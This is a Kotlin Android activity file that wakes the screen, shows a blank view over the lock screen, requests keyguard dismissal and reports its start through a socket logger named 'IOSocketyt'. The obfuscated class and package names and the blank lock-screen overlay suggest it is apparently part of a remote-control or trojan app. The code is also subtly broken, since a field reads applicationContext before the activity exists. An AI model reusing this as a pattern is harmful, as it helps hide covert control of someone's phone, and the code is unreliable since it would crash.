package com.xxx.zzz

import android.annotation.SuppressLint
import android.app.Activity
import android.app.KeyguardManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.view.*
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.xxx.zzz.socketsp.IOSocketyt

class CallActivityADsafC : AppCompatActivity() {

    private lateinit var screenEventReceiver: BroadcastReceiver
    private val kgm = this.applicationContext.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager

    companion object {
        @Suppress("DEPRECATION")
        fun requestDismissKeyguard(activity: Activity) {
            runCatching {
                if (Build.VERSION.SDK_INT >= 26) {
                    val keyguardManager = activity.applicationContext.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
                    keyguardManager.requestDismissKeyguard(activity, null)
                } else {
                    activity.window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
                }
            }
        }

        @Suppress("DEPRECATION")
        fun setShowWhenLocked(activity: Activity, show: Boolean) {
            when {
                Build.VERSION.SDK_INT >= 27 -> activity.setShowWhenLocked(show)
                show -> activity.window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
                else -> activity.window.clearFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
            }
        }

        fun setTurnScreenOn(activity: Activity, turn: Boolean) {
            if (Build.VERSION.SDK_INT >= 27) {
                activity.setTurnScreenOn(turn)
            } else @Suppress("DEPRECATION") if (turn) {
                activity.window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
            } else {
                activity.window.clearFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
            }
        }
    }

    @SuppressLint("ClickableViewAccessibility")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        IOSocketyt.sendLogs("", "CallActivity onCreate", "success")
        window.addFlags(WindowManager.LayoutParams.FLAG_IGNORE_CHEEK_PRESSES)
        val tv = TextView(this)
        tv.text = " "
        setContentView(tv)

        // Must be done after view has been created
        setShowWhenLocked(this, true)
        setTurnScreenOn(this, true)
        requestDismissKeyguard(this)

        screenEventReceiver = object : BroadcastReceiver() {
            override fun onReceive(contxt: Context, intent: Intent) {
                if (kgm.isKeyguardLocked) {
                    setShowWhenLocked(this@CallActivityADsafC, true)
                }
            }
        }
        this.registerReceiver(screenEventReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        runCatching { this.unregisterReceiver(screenEventReceiver) }
    }
}
